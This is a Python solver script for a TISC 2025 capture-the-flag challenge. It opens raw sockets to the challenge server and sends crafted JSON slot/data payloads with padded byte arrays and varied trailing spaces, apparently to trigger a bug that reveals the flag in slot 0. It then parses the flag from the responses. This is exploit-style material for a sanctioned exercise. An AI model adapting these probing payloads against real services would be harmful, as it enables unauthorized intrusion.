#!/usr/bin/env python3
import json
import socket
import time
import sys
import random

HOST = ('chals.tisc25.ctf.sg', 51728)

BASE1 = {"slot": 1, "data": [69, 2, 0]}
BASE2 = {"slot": 1, "data": ([0] * 44) + [65, 11, 0]}
FOLLOW = {"slot": 0}


def send_session(lines, timeout=6, sleep_between=0.15):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect(HOST)
        out = []
        for obj in lines:
            data = (json.dumps(obj) + '\n').encode()
            s.sendall(data)
            try:
                resp = s.recv(16384)
            except socket.timeout:
                resp = b''
            out.append(resp)
            time.sleep(sleep_between)
        return out
    finally:
        try:
            s.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        s.close()


def try_trailing_spaces(max_spaces=8):
    # Try a small set of trailing spaces on the second payload
    spaces = list(range(0, max_spaces))
    random.shuffle(spaces)
    for tr in spaces:
        payload2 = json.loads(json.dumps(BASE2))
        # Append spaces at the end by adding an innocuous key with spaces in value? safer: inject a space string in a no-op way is tricky
        # Simpler: rely on JSON encoder separators to add trailing spaces by manual format
        # We simulate trailing spaces by adding an extra field that is ignored by parser? Risky.
        # Instead, craft the second line manually:
        arr = payload2["data"]
        body = f'{{"slot": 1, "data": {json.dumps(arr)}' + (' ' * tr) + '}'
        # Build session: first payload normal, second as raw string, then slot 0
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(6)
            s.connect(HOST)
            resps = []
            s.sendall((json.dumps(BASE1) + '\n').encode())
            try:
                resps.append(s.recv(16384))
            except socket.timeout:
                resps.append(b'')
            time.sleep(0.15)
            s.sendall((body + '\n').encode())
            try:
                resps.append(s.recv(16384))
            except socket.timeout:
                resps.append(b'')
            time.sleep(0.15)
            s.sendall((json.dumps(FOLLOW) + '\n').encode())
            try:
                resps.append(s.recv(16384))
            except socket.timeout:
                resps.append(b'')
            print(f'tr_spaces={tr}:', b' | '.join(x[:120] for x in resps))
            # Check for flag
            for r in resps:
                if b'TISC{' in r:
                    print(r)
                    return True
                if b'[' in r and b']' in r and b'Slot 0 contains:' in r:
                    try:
                        arr_bytes = r[r.index(b'['): r.index(b']')+1]
                        vals = json.loads(arr_bytes)
                        sflag = ''.join(chr(x) for x in vals if isinstance(x,int) and 0 <= x < 256 and x != 0)
                        if 'TISC{' in sflag:
                            print('FLAG:', sflag)
                            return True
                    except Exception:
                        pass
        except Exception as e:
            print('error', tr, e)
        finally:
            try:
                s.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass
            s.close()
        # modest backoff
        time.sleep(0.25 + random.random()*0.25)
    return False


def main():
    ok = try_trailing_spaces(8)
    sys.exit(0 if ok else 1)

if __name__ == '__main__':
    main()
